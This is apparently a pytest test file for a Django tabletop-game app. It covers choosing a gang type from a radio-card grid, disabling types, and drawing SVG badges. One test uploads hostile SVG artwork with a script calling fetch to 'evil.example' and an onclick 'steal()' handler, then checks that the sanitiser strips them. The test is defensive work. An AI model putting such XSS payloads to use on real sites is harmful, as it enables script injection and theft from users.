"""Founding a gang: picking its type, and seeing what that type looks like.

The type is chosen from a grid of cards rather than a dropdown, so what these
pin is that the grid is still a plain form control — one radio per type over a
shared name, submitting the type the reader pressed — and that a type's badge
is drawn where it has one and nowhere where it does not.
"""

import pytest
from django.contrib.auth.models import User
from django.core.cache import cache
from django.urls import reverse

from n26.core.models import Gang
from n26.library.models import GangType

pytestmark = pytest.mark.django_db

#: Stand-in artwork, the shape of a file an author uploads: one <svg> drawn in
#: a single colour. The path is distinctive so a test can look for it.
ICON = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 12">'
    '<path d="M2 2h8v8H2Z"/></svg>'
)


#: What <c-n26.flair-link> wraps a badge in. Counting these counts the badges
#: actually drawn, which is the only way to tell "no artwork" from "an empty
#: box where the artwork would go".
_FLAIR_WRAPPER = 'class="ml-[0.25em] inline-block'


def _is_checked(body, pk):
    """Whether the radio carrying ``pk`` came back ticked.

    Reads the one input's own attributes rather than looking for the word
    anywhere on the page — the colour picker is a radio group too, and it
    always has one option ticked.
    """
    marker = f'value="{pk}"'
    start = body.index(marker)
    return "checked" in body[start : body.index(">", start)]


@pytest.fixture
def tester(db):
    """Staff, because /n26/ is fenced to staff and testers."""
    return User.objects.create_user("player", is_staff=True)


@pytest.fixture(autouse=True)
def clean_artwork_cache():
    """Artwork is cached twice over — the source against the object it
    was read from, the cleaned markup against a hash of that source —
    and the cache outlives a test. Two tests using the same drawing
    would otherwise share an entry and the second would prove nothing."""
    cache.clear()
    yield
    cache.clear()


@pytest.fixture
def drawn(db, store_artwork):
    return GangType.objects.create(
        name="Goliath",
        icon_url=store_artwork(ICON, "goliath.svg"),
        starting_credits=1000,
    )


@pytest.fixture
def undrawn(db):
    return GangType.objects.create(name="Underhive Outcasts")


class TestPickingATypeFromTheGrid:
    """One radio per type, sharing a name, submitting with the form."""

    def test_every_type_is_a_radio_on_the_page(self, client, tester, drawn, undrawn):
        client.force_login(tester)
        body = client.get(reverse("n26-create-gang")).content.decode()

        assert body.count('type="radio"') >= 2
        assert f'value="{drawn.pk}"' in body
        assert f'value="{undrawn.pk}"' in body
        # One group, so the browser enforces the single choice.
        assert body.count('name="gang_type"') >= 2

    def test_no_dropdown_is_left_behind(self, client, tester, drawn):
        """The select the grid replaced would still submit if it were
        drawn as well, and two controls for one field is how a form comes
        to disagree with itself."""
        client.force_login(tester)
        body = client.get(reverse("n26-create-gang")).content.decode()
        assert '<select id="gang-type"' not in body

    def test_pressing_create_founds_a_gang_of_the_type_that_was_ticked(
        self, client, tester, drawn, undrawn
    ):
        client.force_login(tester)
        response = client.post(
            reverse("n26-create-gang"),
            {
                "name": "Rust in Peace",
                "gang_type": str(undrawn.pk),
                "starting_credits": "",
                "colour": "",
            },
        )

        assert response.status_code == 302
        gang = Gang.objects.get(name="Rust in Peace")
        assert gang.gang_type == undrawn

    def test_a_type_that_is_not_offered_is_refused(self, client, tester, drawn):
        """The grid is drawn from the field's own queryset, so a value
        posted from anywhere else is a validation error and not a gang."""
        client.force_login(tester)
        response = client.post(
            reverse("n26-create-gang"),
            {
                "name": "Nowhere Gang",
                "gang_type": "01JQZ0000000000000000000000",
                "starting_credits": "",
                "colour": "",
            },
        )

        assert response.status_code == 200
        assert not Gang.objects.filter(name="Nowhere Gang").exists()

    def test_a_failed_submit_comes_back_with_the_pick_still_made(
        self, client, tester, drawn, undrawn
    ):
        """The name is required; getting it wrong must not also cost the
        reader the choice they had already made."""
        client.force_login(tester)
        body = client.post(
            reverse("n26-create-gang"),
            {
                "name": "",
                "gang_type": str(drawn.pk),
                "starting_credits": "",
                "colour": "",
            },
        ).content.decode()

        assert _is_checked(body, drawn.pk)
        assert not _is_checked(body, undrawn.pk)

    def test_the_budget_a_type_founds_with_is_on_its_card(
        self, client, tester, drawn, undrawn
    ):
        """And a type that states no budget says nothing, rather than
        claiming a number it does not have."""
        client.force_login(tester)
        body = client.get(reverse("n26-create-gang")).content.decode()
        assert "Founding budget 1,000¢" in body
        assert body.count("Founding budget") == 1


class TestATypeAnAuthorHasTurnedOff:
    """``foundable`` narrows the create screen and nothing else.

    A gang type exists for two reasons that are not the same: a player picks
    it when founding, and a gang already carries it. An author who decides
    nobody should found one of these is answering only the first.
    """

    @pytest.fixture
    def shut(self, db):
        return GangType.objects.create(name="Brutes", foundable=False)

    def test_a_type_says_nothing_and_is_foundable(self, drawn, undrawn):
        """The switch has to be thrown deliberately: every type written
        before anyone could turn one off stays on the screen."""
        assert drawn.foundable is True
        assert undrawn.foundable is True

    def test_it_is_not_one_of_the_cards(self, client, tester, undrawn, shut):
        client.force_login(tester)
        body = client.get(reverse("n26-create-gang")).content.decode()

        assert f'value="{undrawn.pk}"' in body
        assert f'value="{shut.pk}"' not in body
        assert "Brutes" not in body

    def test_posting_its_id_founds_nothing(self, client, tester, undrawn, shut):
        """A card that is not drawn is still an id someone can type, so
        the refusal has to be in the form and not only in the grid."""
        client.force_login(tester)
        response = client.post(
            reverse("n26-create-gang"),
            {
                "name": "Meat Market",
                "gang_type": str(shut.pk),
                "starting_credits": "",
                "colour": "",
            },
        )

        assert response.status_code == 200
        assert not Gang.objects.filter(name="Meat Market").exists()
        assert "not a gang type you can found" in response.content.decode()

    def test_a_gang_that_is_already_one_carries_on(self, client, tester, store_artwork):
        """Turning a type off takes it off one screen. A gang founded
        while it was on keeps its sheet, its name and its badge."""
        shut = GangType.objects.create(
            name="Brutes",
            foundable=False,
            icon_url=store_artwork(ICON, "brutes.svg"),
        )
        gang = Gang.objects.create(
            name="Rust in Peace",
            owner=tester,
            gang_type=shut,
            starting_credits=1000,
            credits=1000,
        )

        client.force_login(tester)
        sheet = client.get(reverse("n26-gang", args=[gang.pk]))
        listing = client.get(reverse("n26-gangs")).content.decode()

        assert sheet.status_code == 200
        body = sheet.content.decode()
        assert "Brutes" in body
        assert 'd="M2 2h8v8H2Z"' in body
        assert "Brutes" in listing


class TestTheBadgeOnTheGrid:
    def test_a_type_with_artwork_draws_it(self, client, tester, drawn):
        client.force_login(tester)
        body = client.get(reverse("n26-create-gang")).content.decode()
        assert 'd="M2 2h8v8H2Z"' in body

    def test_a_type_without_artwork_holds_no_space(
        self, client, tester, drawn, undrawn
    ):
        """flair-link draws the badge's wrapper only when there is a badge,
        so a grid of mixed types keeps one left edge down its names."""
        client.force_login(tester)
        body = client.get(reverse("n26-create-gang")).content.decode()
        assert body.count(_FLAIR_WRAPPER) == 1

    def test_hostile_artwork_never_reaches_the_page(
        self, client, tester, store_artwork
    ):
        """Artwork is a file an author uploaded and storage handed back.
        It is cleaned where it is drawn, so a page cannot forget to."""
        GangType.objects.create(
            name="Trouble",
            icon_url=store_artwork(
                '<svg viewBox="0 0 8 8"><script>fetch("//evil.example")</script>'
                '<path d="M0 0" onclick="steal()"/></svg>',
                "trouble.svg",
            ),
        )
        client.force_login(tester)
        body = client.get(reverse("n26-create-gang")).content.decode()

        assert "evil.example" not in body
        assert "steal()" not in body
        assert "onclick" not in body
        # The drawing itself still arrives — cleaning is not refusing.
        assert 'd="M0 0"' in body


class TestTheBadgeEverywhereElse:
    """The same drawing, wherever a gang type is named."""

    @pytest.fixture
    def gangs(self, tester, drawn, undrawn):
        for name, type_ in (("Rust in Peace", drawn), ("Sump City Rats", undrawn)):
            Gang.objects.create(
                name=name,
                owner=tester,
                gang_type=type_,
                starting_credits=1000,
                credits=1000,
            )

    def test_on_the_gangs_page(self, client, tester, gangs):
        """Twice: once in the row, once in the drawer that every page of
        the edition carries. The gang with no artwork adds neither."""
        client.force_login(tester)
        body = client.get(reverse("n26-gangs")).content.decode()
        assert body.count('d="M2 2h8v8H2Z"') == 2
        assert body.count(_FLAIR_WRAPPER) == 2

    def test_on_the_dashboard(self, client, tester, gangs):
        client.force_login(tester)
        body = client.get(reverse("n26-dashboard")).content.decode()
        assert 'd="M2 2h8v8H2Z"' in body

    def test_on_the_gang_sheet(self, client, tester, drawn, undrawn):
        """The sheet's lead is the type, so the badge sits there. The gang
        with no artwork gets a lead that is the bare name, not a gap."""
        with_art = Gang.objects.create(
            name="Rust in Peace",
            owner=tester,
            gang_type=drawn,
            starting_credits=1000,
            credits=1000,
        )
        without = Gang.objects.create(
            name="Sump City Rats",
            owner=tester,
            gang_type=undrawn,
            starting_credits=1000,
            credits=1000,
        )

        client.force_login(tester)
        drawn_body = client.get(
            reverse("n26-gang", args=[with_art.pk])
        ).content.decode()
        plain_body = client.get(reverse("n26-gang", args=[without.pk])).content.decode()

        # The drawer lists both gangs on either page, so it draws the badge
        # once whichever sheet is open. The lead is the second one.
        assert drawn_body.count('d="M2 2h8v8H2Z"') == 2
        assert plain_body.count('d="M2 2h8v8H2Z"') == 1
        assert "Underhive Outcasts" in plain_body

    def test_and_in_the_navigation_drawer(self, client, tester, gangs):
        """The drawer is on every page of the edition, so the count is
        two on a page that also lists the gang: once in the drawer, once
        in the row."""
        client.force_login(tester)
        body = client.get(reverse("n26-gangs")).content.decode()
        assert body.count("Rust in Peace") >= 2
